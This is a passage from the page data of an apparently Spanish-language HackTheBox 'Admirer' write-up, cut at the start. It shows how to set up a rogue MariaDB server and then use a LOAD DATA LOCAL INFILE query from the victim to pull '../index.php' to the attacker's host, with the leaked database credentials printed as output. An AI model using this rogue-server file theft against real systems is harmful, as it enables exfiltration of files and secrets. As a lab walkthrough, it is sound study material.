servicio)</span>\n<span class=\"token comment\">-- # tabla y usuario</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">DATABASE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">USE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> shit <span class=\"token punctuation\">(</span>name <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">USER</span> <span class=\"token string\">'some'</span><span class=\"token variable\">@'10.10.10.187'</span> IDENTIFIED <span class=\"token keyword\">BY</span> <span class=\"token string\">'some123*'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">GRANT</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">PRIVILEGES</span> <span class=\"token keyword\">ON</span> <span class=\"token keyword\">backup</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">TO</span> <span class=\"token string\">'some'</span><span class=\"token variable\">@'10.10.10.187'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- # servicio</span>\n<span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>mysql<span class=\"token operator\">/</span>mariadb<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span>d<span class=\"token operator\">/</span><span class=\"token number\">50</span><span class=\"token operator\">-</span>server<span class=\"token punctuation\">.</span>cnf\nbind<span class=\"token operator\">-</span>address <span class=\"token operator\">=</span> <span class=\"token number\">10.10</span><span class=\"token number\">.14</span><span class=\"token number\">.2</span>\n<span class=\"token comment\">-- # opcional: firewall (allow)</span>\nufw allow <span class=\"token keyword\">from</span> <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.187</span> <span class=\"token keyword\">to</span> <span class=\"token keyword\">any</span> port <span class=\"token number\">3306</span>\n<span class=\"token comment\">-- # restart servicio </span>\nsystemctl restart mariadb\n\n<span class=\"token comment\">-- Victim</span>\n<span class=\"token comment\">-- # DB-Client</span>\nServer: <span class=\"token operator\">&lt;</span>attacker<span class=\"token operator\">-</span>ip<span class=\"token operator\">></span>\nUsername: <span class=\"token keyword\">some</span>\nPassword: some123<span class=\"token operator\">*</span>\n<span class=\"token keyword\">Database</span>: <span class=\"token keyword\">some</span>\n<span class=\"token comment\">-- # Query</span>\n<span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'../index.php'</span>\n<span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">.</span>shit\n<span class=\"token keyword\">FIELDS</span> <span class=\"token keyword\">TERMINATED</span> <span class=\"token keyword\">BY</span> <span class=\"token string\">\"\\n\"</span> <span class=\"token comment\">-- # permite que cada linea se guarde en una row de la tabla</span>\n<span class=\"token comment\">-- # La informacion esta disponible en database.tabla</span>\n <span class=\"token keyword\">row</span>:\t  <span class=\"token operator\">&lt;</span>?php\n <span class=\"token keyword\">row</span>:\t  $username <span class=\"token operator\">=</span> <span class=\"token string\">\"waldo\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">row</span>:\t  $password <span class=\"token operator\">=</span> <span class=\"token string\">\"&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">row</span>:\t  $dbname <span class=\"token operator\">=</span> <span class=\"token string\">\"admirerdb\"</span><span class=\"token punctuation\">;</span></code></pre></div>","categories":["DB","Theory","Basic"],"date":"November 15, 2025","description":"Base de Datos","id":"8595145f-2800-5947-9fc6-f86a65fa3be1","keywords":["DB","Theory","Basic"],"slug":"/htb-admirer/","title":"HTB Admirer","readingTime":{"text":"2 min read"}}]}},"staticQueryHashes":["3262260831","948380417"],"slicesMap":{}}